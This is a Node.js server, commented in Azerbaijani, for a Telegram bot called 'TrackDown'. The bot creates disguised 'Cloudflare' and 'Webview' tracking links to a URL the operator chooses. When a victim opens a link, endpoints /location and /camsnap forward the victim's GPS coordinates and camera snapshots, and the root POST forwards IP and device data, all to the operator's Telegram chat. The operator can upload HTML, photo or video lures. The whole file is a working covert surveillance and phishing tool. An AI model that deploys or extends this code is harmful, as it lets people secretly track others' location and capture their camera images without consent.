/**
 * ============================================================
 *  TrackDown — Ana Server
 *  Dəstəklənən: Railway · Render · Heroku · Fly.io · Replit · VPS
 * ============================================================
 */

const config      = require('./config');
const fs          = require('fs');
const path        = require('path');
const express     = require('express');
const cors        = require('cors');
const bp          = require('body-parser');
const fetch       = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');

// ═══════════════════════════════════════════════════════════
//  YARDIMÇI FUNKSİYALAR
// ═══════════════════════════════════════════════════════════

function b64Encode(str) {
  return Buffer.from(str, 'utf8')
    .toString('base64')
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=/g,  '');
}

function b64Decode(str) {
  let s = str.replace(/-/g, '+').replace(/_/g, '/');
  while (s.length % 4) s += '=';
  return Buffer.from(s, 'base64').toString('utf8');
}

function getClientIP(req) {
  const forwarded = req.headers['x-forwarded-for'];
  if (forwarded) return forwarded.split(',')[0].trim();
  return req.connection?.remoteAddress || req.ip || '';
}

function buildHostFromReq(req) {
  const proto = (req.headers['x-forwarded-proto'] || req.protocol || 'https')
    .split(',')[0].trim();
  const host  = req.headers['x-forwarded-host'] || req.headers.host || '';
  return host ? `${proto}://${host}` : null;
}

function getHostURL(req) {
  if (config.STATIC_HOST) return config.STATIC_HOST;
  return buildHostFromReq(req);
}

function getMediaType() {
  const dir = path.join(__dirname, 'view');
  if (fs.existsSync(path.join(dir, 'photo.png')))   return 'photo';
  if (fs.existsSync(path.join(dir, 'video.mp4')))   return 'video';
  if (fs.existsSync(path.join(dir, 'animate.gif'))) return 'gif';
  return 'none';
}

// ═══════════════════════════════════════════════════════════
//  RUNTIME HOST TRACKER
// ═══════════════════════════════════════════════════════════
let runtimeHost = config.STATIC_HOST || null;

function updateRuntimeHost(req) {
  if (runtimeHost) return;
  const url = buildHostFromReq(req);
  if (!url || url.includes('localhost') || url.includes('127.0.0.1')) return;
  runtimeHost = url;
  console.log(`🌐  Host URL avtomatik müəyyən edildi: ${runtimeHost}`);
}

// ═══════════════════════════════════════════════════════════
//  DEPOLAMA SİSTEMİ
// ═══════════════════════════════════════════════════════════
const DATA_FILE = path.join(__dirname, 'data.json');

function loadData() {
  try {
    if (fs.existsSync(DATA_FILE)) return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
  } catch(_) {}
  return { links: {}, bots: [] };
}

function saveData(data) {
  try { fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2), 'utf8'); } catch(_) {}
}

function isLinkActive(uid) {
  const d = loadData();
  return d.links && d.links[uid] ? d.links[uid].active !== false : true;
}

function deactivateLink(uid) {
  const d = loadData();
  if (!d.links) d.links = {};
  if (!d.links[uid]) d.links[uid] = {};
  d.links[uid].active = false;
  saveData(d);
}

function trackLink(uid, url) {
  const d = loadData();
  if (!d.links) d.links = {};
  if (!d.links[uid]) d.links[uid] = {};
  d.links[uid].active = true;
  d.links[uid].url   = url;
  d.links[uid].ts    = Date.now();
  saveData(d);
}

// Deaktiv link HTML
const DEACTIVATED_HTML = `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box;}
html,body{width:100%;height:100%;background:#000;
  display:flex;align-items:center;justify-content:center;}
.msg{color:#fff;font-size:clamp(13px,3.5vw,20px);
  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
  font-weight:500;text-align:center;padding:24px;line-height:1.4;}
</style>
</head>
<body>
<p class="msg">⚓THE LIFE IS NOT FAIR, YOU SHOULD NOT BE A FAIR⚓</p>
</body>
</html>`;

// ═══════════════════════════════════════════════════════════
//  ADMİN PANELİ STEYTİ (yaddaşda)
// ═══════════════════════════════════════════════════════════
const adminState = new Map(); // chatId → { action: string }

// ═══════════════════════════════════════════════════════════
//  EXPRESS QURAŞDIRMASI
// ═══════════════════════════════════════════════════════════
const app = express();
app.use(bp.json({ limit: '20mb', type: 'application/json' }));
app.use(bp.urlencoded({ extended: true, limit: '20mb' }));
app.use(cors());
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'view'));
app.use('/static', express.static(path.join(__dirname, 'view')));
app.set('trust proxy', true);
app.use((req, _res, next) => { updateRuntimeHost(req); next(); });

const USE_SHORTENER = false;

// ═══════════════════════════════════════════════════════════
//  ROUTES
// ═══════════════════════════════════════════════════════════

// Webview linki
app.get('/w/:uid/:uri', (req, res) => {
  const { uid, uri } = req.params;
  if (!uid) return res.redirect('https://t.me/th30neand0nly0ne');

  if (!isLinkActive(uid)) return res.send(DEACTIVATED_HTML);

  let targetUrl;
  try { targetUrl = b64Decode(uri); } catch (_) { return res.status(400).send('Yanlış link'); }

  res.render('webview', {
    ip:        getClientIP(req),
    time:      new Date().toJSON().slice(0, 19).replace('T', ' '),
    url:       targetUrl,
    uid,
    a:         getHostURL(req),
    t:         USE_SHORTENER,
    mediaType: getMediaType()
  });
});

// Cloudflare linki
app.get('/c/:uid/:uri', (req, res) => {
  const { uid, uri } = req.params;
  if (!uid) return res.redirect('https://t.me/th30neand0nly0ne');

  if (!isLinkActive(uid)) return res.send(DEACTIVATED_HTML);

  let targetUrl;
  try { targetUrl = b64Decode(uri); } catch (_) { return res.status(400).send('Yanlış link'); }

  res.render('cloudflare', {
    ip:        getClientIP(req),
    time:      new Date().toJSON().slice(0, 19).replace('T', ' '),
    url:       targetUrl,
    uid,
    a:         getHostURL(req),
    t:         USE_SHORTENER,
    mediaType: getMediaType()
  });
});

// Ana səhifə
app.get('/', (req, res) => {
  res.json({ status: 'TrackDown aktiv', ip: getClientIP(req) });
});

// ═══════════════════════════════════════════════════════════
//  DATA TOPLAMA ENDPOİNTLƏR
// ═══════════════════════════════════════════════════════════

app.post('/', (req, res) => {
  const uid  = decodeURIComponent(req.body.uid  || '');
  const data = decodeURIComponent(req.body.data || '');
  const ip   = getClientIP(req);

  if (!uid || !data || !data.includes(ip)) return res.send('ok');

  bot.sendMessage(parseInt(uid, 36), data.replaceAll('<br>', '\n'), { parse_mode: 'HTML' })
     .catch(() => {});
  res.send('Done');
});

app.post('/location', (req, res) => {
  const lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
  const lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
  const uid = decodeURIComponent(req.body.uid) || null;
  const acc = decodeURIComponent(req.body.acc) || null;

  if (!lat || !lon || !uid) return res.send('ok');

  const chatId = parseInt(uid, 36);
  bot.sendLocation(chatId, lat, lon).catch(() => {});
  bot.sendMessage(chatId, `📍 GPS Məkanı\nEnlik: ${lat}\nUzunluq: ${lon}\nDəqiqlik: ${acc} metr`).catch(() => {});
  res.send('Done');
});

app.post('/camsnap', (req, res) => {
  const uid = decodeURIComponent(req.body.uid || '');
  const img = decodeURIComponent(req.body.img || '');

  if (!uid || !img) return res.send('ok');

  const buffer = Buffer.from(img, 'base64');
  bot.sendPhoto(parseInt(uid, 36), buffer, {}, { filename: 'camsnap.png', contentType: 'image/png' })
     .catch(err => console.error('Kamera xətası:', err.message));
  res.send('Done');
});

// ═══════════════════════════════════════════════════════════
//  TELEGRAM BOT
// ═══════════════════════════════════════════════════════════
const bot = new TelegramBot(config.TOKEN, { polling: true });

// ── Fayl yükləmə yardımçısı ─────────────────────────────────
async function downloadTelegramFile(fileId, savePath) {
  try {
    const info = await bot.getFile(fileId);
    const url  = `https://api.telegram.org/file/bot${config.TOKEN}/${info.file_path}`;
    const resp = await fetch(url);
    const buf  = await resp.buffer();
    fs.mkdirSync(path.dirname(savePath), { recursive: true });
    fs.writeFileSync(savePath, buf);
    return true;
  } catch(e) {
    console.error('Fayl yükləmə xətası:', e.message);
    return false;
  }
}

// ── Mesaj handler ────────────────────────────────────────────
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const cidStr = chatId.toString();

  // Admin state yoxla (Yeni bot token gözlənilir)
  if (adminState.has(cidStr)) {
    const st = adminState.get(cidStr);

    if (st.action === 'wait_bot_token' && msg.text && !msg.text.startsWith('/')) {
      adminState.delete(cidStr);
      const newToken = msg.text.trim();
      if (!/^\d+:[A-Za-z0-9_-]{35,}$/.test(newToken)) {
        return bot.sendMessage(chatId, '❌ Yanlış token formatı. Düzgün token daxil edin.');
      }
      const d = loadData();
      if (!d.bots) d.bots = [];
      d.bots.push({ token: newToken, addedAt: Date.now() });
      saveData(d);
      await bot.sendMessage(chatId, '✅ Bot əlavə edildi!');
      return showAdminPanel(chatId);
    }
  }

  // Reply-based URL (mövcud funksionallıq)
  if (msg?.reply_to_message?.text === '🌐 Enter Your URL') {
    return createLink(chatId, msg.text);
  }

  // Fayl qəbulu — ŞƏKİL
  if (msg.photo) {
    const photo  = msg.photo[msg.photo.length - 1];
    const saveTo = path.join(__dirname, 'view', 'photo.png');
    // Əgər video varsa, əvvəl sil
    const vidPath = path.join(__dirname, 'view', 'video.mp4');
    if (fs.existsSync(vidPath)) fs.unlinkSync(vidPath);

    const ok = await downloadTelegramFile(photo.file_id, saveTo);
    return bot.sendMessage(chatId, ok
      ? '✅ Şəkil qeydə alındı. /create ilə link yaradanda istifadə ediləcək.'
      : '❌ Şəkil yüklənərkən xəta baş verdi.');
  }

  // Fayl qəbulu — VİDEO
  if (msg.video) {
    const saveTo = path.join(__dirname, 'view', 'video.mp4');
    // Əgər foto varsa, əvvəl sil
    const photoPath = path.join(__dirname, 'view', 'photo.png');
    if (fs.existsSync(photoPath)) fs.unlinkSync(photoPath);

    await bot.sendMessage(chatId, '⏳ Video yüklənir, zəhmət olmasa gözləyin...');
    const ok = await downloadTelegramFile(msg.video.file_id, saveTo);
    return bot.sendMessage(chatId, ok
      ? '✅ Video qeydə alındı. /create ilə link yaradanda istifadə ediləcək.'
      : '❌ Video yüklənərkən xəta baş verdi. (Ölçü limiti: 20MB)');
  }

  // Fayl qəbulu — HTML SƏNƏD
  if (msg.document) {
    const doc  = msg.document;
    const name = (doc.file_name || '').toLowerCase();
    if (!name.endsWith('.html') && !name.endsWith('.htm')) {
      return bot.sendMessage(chatId, 'ℹ️ Yalnız .html faylları qəbul edilir.');
    }
    const saveTo = path.join(__dirname, 'view', 'index.html');
    const ok = await downloadTelegramFile(doc.file_id, saveTo);
    return bot.sendMessage(chatId, ok
      ? '✅ HTML faylı qeydə alındı. /create ilə link yaradanda istifadə ediləcək.'
      : '❌ Fayl yüklənərkən xəta baş verdi.');
  }

  // Komandalar
  switch (msg.text) {

    case '/start': {
      const caption =
        `◈ 𝐓𝐇𝐄 𝐋𝐈𝐅𝐄 𝐈𝐒 𝐍𝐎𝐓 𝐅𝐀𝐈𝐑 ◈\n` +
        `◈ 𝐘𝐎𝐔 𝐒𝐇𝐎𝐔𝐋𝐃 𝐍𝐎𝐓 𝐁𝐄 𝐀 𝐅𝐀𝐈𝐑 ◈\n` +
        `▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n` +
        `⚓ 𝘽𝙤𝙩 𝘾𝙧𝙚𝙖𝙩𝙚𝙙 𝙗𝙮 𝙊𝙍𝙐𝙅𝙊𝙑 ⚓\n\n` +
        `Başlamaq üçün /create yazın.`;

      const markup = {
        reply_markup: JSON.stringify({
          inline_keyboard: [[{ text: '🔗 Link Yarat', callback_data: 'crenew' }]]
        })
      };

      const imgPath = path.join(__dirname, 'bot', 'bot.png');
      if (fs.existsSync(imgPath)) {
        bot.sendPhoto(chatId, imgPath, { caption, ...markup });
      } else {
        bot.sendMessage(chatId, `Xoş gəldiniz, ${msg.chat.first_name}!\n\n${caption}`, markup);
      }
      break;
    }

    case '/create':
      createNew(chatId);
      break;

    case '/help':
      bot.sendMessage(chatId,
        `ℹ️ *TrackDown — Yardım*\n\n` +
        `Bu bot izləmə linki yaratmağa kömək edir.\n\n` +
        `*Addımlar:*\n` +
        `1️⃣ /create yazın\n` +
        `2️⃣ Hədəfə göstərmək istədiyiniz URL-i göndərin\n` +
        `3️⃣ 2 izləmə linki alacaqsınız\n\n` +
        `*Yükləmə:*\n` +
        `📷 Şəkil → linkin arxa planı\n` +
        `🎬 Video → linki açanda göstərilir\n` +
        `📄 HTML faylı → linki açanda işləyir\n\n` +
        `*Admin:* /66`,
        { parse_mode: 'Markdown' }
      );
      break;

    case '/66':
      showAdminPanel(chatId);
      break;
  }
});

// ── Callback handler ─────────────────────────────────────────
bot.on('callback_query', async (cbq) => {
  bot.answerCallbackQuery(cbq.id);
  const chatId = cbq.message.chat.id;
  const msgId  = cbq.message.message_id;
  const data   = cbq.data;

  // Link deaktivasiyası
  if (data.startsWith('deactivate:')) {
    const uid = data.split(':')[1];
    deactivateLink(uid);
    return bot.editMessageText(
      '🔴 Link deaktiv edildi.\n\nLink açıldıqda yalnız:\n⚓THE LIFE IS NOT FAIR, YOU SHOULD NOT BE A FAIR⚓\ngörünəcək.',
      { chat_id: chatId, message_id: msgId }
    ).catch(() => bot.sendMessage(chatId, '🔴 Link deaktiv edildi.'));
  }

  // Yeni link
  if (data === 'crenew') {
    return createNew(chatId);
  }

  // Admin panel
  if (data === 'panel_main') return showAdminPanel(chatId, msgId);
  if (data === 'panel_bots') return showBotsPanel(chatId, msgId);
  if (data === 'panel_files') return showFilesPanel(chatId, msgId);
  if (data === 'panel_delete_files') return confirmDeleteFiles(chatId, msgId);
  if (data === 'panel_delete_files_ok') return doDeleteFiles(chatId, msgId);
  if (data === 'panel_add_bot') return startAddBot(chatId, msgId);
  if (data === 'panel_close') return bot.deleteMessage(chatId, msgId).catch(() => {});
  if (data.startsWith('panel_del_bot:')) {
    const idx = parseInt(data.split(':')[1], 10);
    return deleteBot(chatId, msgId, idx);
  }
});

bot.on('polling_error', (err) => {
  if (err.code === 'ETELEGRAM' && err.message.includes('409')) return;
  console.error(`❌ Telegram xətası: [${err.code}] ${err.message}`);
});

// ═══════════════════════════════════════════════════════════
//  ADMİN PANELİ FUNKSİYALARI
// ═══════════════════════════════════════════════════════════

function adminMainKeyboard() {
  return {
    reply_markup: JSON.stringify({
      inline_keyboard: [
        [{ text: '🤖 Botlar', callback_data: 'panel_bots' }, { text: '📁 Fayllar', callback_data: 'panel_files' }],
        [{ text: '🗑 Yüklənənləri Sil', callback_data: 'panel_delete_files' }],
        [{ text: '➕ Yeni Bot Əlavə Et', callback_data: 'panel_add_bot' }],
        [{ text: '❌ Bağla', callback_data: 'panel_close' }]
      ]
    })
  };
}

async function showAdminPanel(chatId, msgId) {
  const d      = loadData();
  const bots   = d.bots || [];
  const media  = getMediaType();
  const mediaLabel = media === 'video' ? '🎬 Video' : media === 'photo' ? '📷 Şəkil' : media === 'gif' ? '🖼 GIF' : '📄 HTML / Yoxdur';

  const text =
    `⚙️ *Admin Panel*\n\n` +
    `🤖 Botlar: ${bots.length + 1}\n` +
    `📁 Aktiv media: ${mediaLabel}`;

  const markup = adminMainKeyboard();

  if (msgId) {
    return bot.editMessageText(text, { chat_id: chatId, message_id: msgId, parse_mode: 'Markdown', ...markup }).catch(() =>
      bot.sendMessage(chatId, text, { parse_mode: 'Markdown', ...markup })
    );
  }
  return bot.sendMessage(chatId, text, { parse_mode: 'Markdown', ...markup });
}

async function showBotsPanel(chatId, msgId) {
  const d    = loadData();
  const bots = d.bots || [];

  const mainTokenShort = config.TOKEN.split(':')[0] + ':***';
  let text = `🤖 *Botlar*\n\n1. Ana Bot — \`${mainTokenShort}\` (silinə bilməz)\n`;

  const keyboard = [];
  bots.forEach((b, i) => {
    const tShort = b.token.split(':')[0] + ':***';
    text += `${i + 2}. Bot — \`${tShort}\`\n`;
    keyboard.push([{ text: `🗑 Bot ${i + 2} sil`, callback_data: `panel_del_bot:${i}` }]);
  });

  keyboard.push([{ text: '⬅️ Geri', callback_data: 'panel_main' }]);

  return bot.editMessageText(text, {
    chat_id: chatId, message_id: msgId,
    parse_mode: 'Markdown',
    reply_markup: JSON.stringify({ inline_keyboard: keyboard })
  }).catch(() => bot.sendMessage(chatId, text, { parse_mode: 'Markdown', reply_markup: JSON.stringify({ inline_keyboard: keyboard }) }));
}

async function showFilesPanel(chatId, msgId) {
  const dir = path.join(__dirname, 'view');
  const files = [
    { name: 'video.mp4',    label: '🎬 Video',    key: 'video.mp4' },
    { name: 'photo.png',    label: '📷 Şəkil',    key: 'photo.png' },
    { name: 'animate.gif',  label: '🖼 GIF',       key: 'animate.gif' },
    { name: 'index.html',   label: '📄 HTML',      key: 'index.html' },
  ];

  let text = `📁 *Yüklənmiş Fayllar*\n\n`;
  let hasAny = false;

  files.forEach(f => {
    const fp = path.join(dir, f.name);
    if (fs.existsSync(fp)) {
      const stat = fs.statSync(fp);
      const kb   = (stat.size / 1024).toFixed(1);
      text += `✅ ${f.label}: ${f.name} (${kb} KB)\n`;
      hasAny = true;
    }
  });

  if (!hasAny) text += 'Heç bir fayl yüklənməyib.\n';

  const keyboard = [[{ text: '⬅️ Geri', callback_data: 'panel_main' }]];

  return bot.editMessageText(text, {
    chat_id: chatId, message_id: msgId,
    parse_mode: 'Markdown',
    reply_markup: JSON.stringify({ inline_keyboard: keyboard })
  }).catch(() => bot.sendMessage(chatId, text, { parse_mode: 'Markdown', reply_markup: JSON.stringify({ inline_keyboard: keyboard }) }));
}

async function confirmDeleteFiles(chatId, msgId) {
  return bot.editMessageText(
    '⚠️ *Bütün yüklənmiş faylları silmək istəyirsiniz?*\nVideo, şəkil, GIF silinəcək.',
    {
      chat_id: chatId, message_id: msgId,
      parse_mode: 'Markdown',
      reply_markup: JSON.stringify({
        inline_keyboard: [
          [{ text: '✅ Bəli, sil', callback_data: 'panel_delete_files_ok' }, { text: '❌ Xeyr', callback_data: 'panel_main' }]
        ]
      })
    }
  ).catch(() => {});
}

async function doDeleteFiles(chatId, msgId) {
  const dir = path.join(__dirname, 'view');
  ['video.mp4', 'photo.png', 'animate.gif'].forEach(f => {
    const fp = path.join(dir, f);
    if (fs.existsSync(fp)) fs.unlinkSync(fp);
  });
  await bot.editMessageText('✅ Bütün yüklənmiş fayllar silindi.',
    { chat_id: chatId, message_id: msgId }
  ).catch(() => bot.sendMessage(chatId, '✅ Bütün yüklənmiş fayllar silindi.'));

  setTimeout(() => showAdminPanel(chatId, msgId).catch(() => {}), 1200);
}

async function startAddBot(chatId, msgId) {
  adminState.set(chatId.toString(), { action: 'wait_bot_token' });
  await bot.editMessageText(
    '🤖 *Yeni Bot Əlavə Et*\n\nBotFather-dən aldığınız tokeni göndərin:',
    { chat_id: chatId, message_id: msgId, parse_mode: 'Markdown',
      reply_markup: JSON.stringify({ inline_keyboard: [[{ text: '❌ İmtina', callback_data: 'panel_main' }]] }) }
  ).catch(() => bot.sendMessage(chatId, '🤖 Yeni bot tokenini göndərin:'));
}

async function deleteBot(chatId, msgId, idx) {
  const d = loadData();
  if (!d.bots || !d.bots[idx]) return;
  d.bots.splice(idx, 1);
  saveData(d);
  await bot.sendMessage(chatId, '✅ Bot silindi.').catch(() => {});
  return showBotsPanel(chatId, msgId);
}

// ═══════════════════════════════════════════════════════════
//  LİNK YARATMA
// ═══════════════════════════════════════════════════════════

function createNew(cid) {
  bot.sendMessage(cid, '🌐 Enter Your URL', {
    reply_markup: JSON.stringify({ force_reply: true })
  });
}

async function createLink(cid, text) {
  const isURL      = /^https?:\/\/.+/i.test(text.trim());
  const hasUnicode = [...text].some(c => c.charCodeAt(0) > 127);

  if (!isURL || hasUnicode) {
    await bot.sendMessage(cid, '⚠️ Zəhmət olmasa https:// ilə başlayan düzgün URL göndərin.');
    return createNew(cid);
  }

  const host = runtimeHost;
  if (!host) {
    return bot.sendMessage(cid,
      '⚠️ *Host URL hələ müəyyən edilməyib.*\n\n' +
      'Həll yolu:\n' +
      '`bot.js` faylında domain sahəsini doldurun:\n' +
      '`domain: "https://sizin-site.com"`\n\n' +
      'Dəyişiklikdən sonra serveri yenidən başladın.',
      { parse_mode: 'Markdown' }
    );
  }

  const uid  = cid.toString(36);
  const enc  = b64Encode(text.trim());
  const cUrl = `${host}/c/${uid}/${enc}`;
  const wUrl = `${host}/w/${uid}/${enc}`;

  // Linki izlə
  trackLink(uid, text.trim());

  const media = getMediaType();
  const mediaNote = media !== 'none'
    ? `\n\n📎 Aktiv media: ${media === 'video' ? '🎬 Video' : media === 'photo' ? '📷 Şəkil' : media === 'gif' ? '🖼 GIF' : '📄 HTML'}`
    : '';

  bot.sendChatAction(cid, 'typing');

  if (USE_SHORTENER) {
    try {
      const [rx, ry] = await Promise.all([
        fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(cUrl)}`).then(r => r.json()),
        fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(wUrl)}`).then(r => r.json())
      ]);
      return bot.sendMessage(cid,
        `✅ *Linklər hazırdır!*\n🔗 URL: ${text}${mediaNote}\n\n` +
        `🔵 *Cloudflare*\n${Object.values(rx).join('\n')}\n\n` +
        `🟢 *Webview*\n${Object.values(ry).join('\n')}`,
        {
          parse_mode: 'Markdown',
          reply_markup: JSON.stringify({
            inline_keyboard: [
              [{ text: '🔗 Yeni Link Yarat', callback_data: 'crenew' }],
              [{ text: '🔴 Deaktiv et', callback_data: `deactivate:${uid}` }]
            ]
          })
        }
      );
    } catch (_) {}
  }

  bot.sendMessage(cid,
    `✅ *Linklər hazırdır!*\n` +
    `🔗 URL: ${text}${mediaNote}\n\n` +
    `🔵 *Cloudflare Link*\n${cUrl}\n\n` +
    `🟢 *Webview Link*\n${wUrl}`,
    {
      parse_mode: 'Markdown',
      reply_markup: JSON.stringify({
        inline_keyboard: [
          [{ text: '🔗 Yeni Link Yarat', callback_data: 'crenew' }],
          [{ text: '🔴 Deaktiv et', callback_data: `deactivate:${uid}` }]
        ]
      })
    }
  );
}

// ═══════════════════════════════════════════════════════════
//  SERVER BAŞLAT
// ═══════════════════════════════════════════════════════════
app.listen(config.PORT, () => {
  console.log(`🚀  Server işləyir — Port: ${config.PORT}`);
});
